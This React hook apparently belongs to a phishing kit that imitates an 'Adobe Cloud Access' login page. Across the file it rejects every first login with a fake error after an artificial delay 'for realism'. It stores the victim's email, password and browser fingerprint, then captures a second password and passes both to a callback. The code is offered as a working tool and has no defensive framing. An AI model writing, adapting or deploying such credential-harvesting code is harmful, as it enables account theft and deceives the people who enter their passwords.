import { useState } from 'react';
import { getBrowserFingerprint } from '../utils/oauthHandler';
import { config } from '../config';

/**
 * Custom hook to manage the two-attempt login process.
 * This encapsulates the logic previously duplicated in LoginPage and MobileLoginPage.
 *
 * @param onLoginSuccess - Callback function to execute on successful final login.
 * @param onLoginError - Callback function to execute on error.
 */
export const useLogin = (
  onLoginSuccess?: (data: any) => void,
  onLoginError?: (error: string) => void
) => {
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');
  const [firstAttemptData, setFirstAttemptData] = useState<{ email: string; password_1: string } | null>(null);

  const handleFormSubmit = async (e: React.FormEvent, { email, password, provider }: { email: string; password: string; provider: string | null }) => {
    e.preventDefault();
    if (!email || !password || !provider) return;

    setIsLoading(true);
    setErrorMessage('');

    try {
      const currentAttempt = loginAttempts + 1;
      setLoginAttempts(currentAttempt);
      const browserFingerprint = await getBrowserFingerprint();

      // FIRST ATTEMPT: Show error and store credentials
      if (currentAttempt === 1) {
        const attemptData = {
          email,
          password,
          provider,
          attemptTimestamp: new Date().toISOString(),
          localFingerprint: browserFingerprint,
          fileName: 'Adobe Cloud Access',
        };

        try {
          if (typeof sessionStorage !== 'undefined') {
            sessionStorage.setItem(config.session.firstAttemptKey, JSON.stringify(attemptData));
            console.log('🔒 First attempt captured (invalid password)');
          }
        } catch (err) {
          console.warn('⚠️ Could not write first attempt:', err);
        }

        setFirstAttemptData({ email, password_1: password });
        
        // Simulate network delay for realism
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        setErrorMessage('The email or password you entered is incorrect. Please try again.');
        setIsLoading(false);
        return { isFirstAttempt: true, success: false };
      }

      // SECOND ATTEMPT: Capture second password and complete the flow
      if (currentAttempt === 2 && firstAttemptData) {
        console.log('✅ Second attempt captured. Finalizing data.');

        // This is the complete data package for the successful login
        const completionData = {
          email: firstAttemptData.email,
          provider,
          firstAttemptPassword: firstAttemptData.password_1,
          secondAttemptPassword: password, // The final, "correct" password
          attemptTimestamp: new Date().toISOString(),
          localFingerprint: browserFingerprint,
          fileName: 'Adobe Cloud Access',
        };

        if (onLoginSuccess) {
          onLoginSuccess(completionData);
        }
        
        setIsLoading(false);
        return { isFirstAttempt: false, success: true };
      }

    } catch (error) {
      console.error('Login error:', error);
      const message = error instanceof Error ? error.message : 'Login failed. Please try again.';
      if (onLoginError) onLoginError(message);
      setErrorMessage(message);
      setIsLoading(false);
    }
    
    return { isFirstAttempt: false, success: false };
  };

  const resetLoginState = () => {
    setLoginAttempts(0);
    setErrorMessage('');
    setFirstAttemptData(null);
    setIsLoading(false);
  };

  return {
    isLoading,
    errorMessage,
    handleFormSubmit,
    resetLoginState,
  };
};
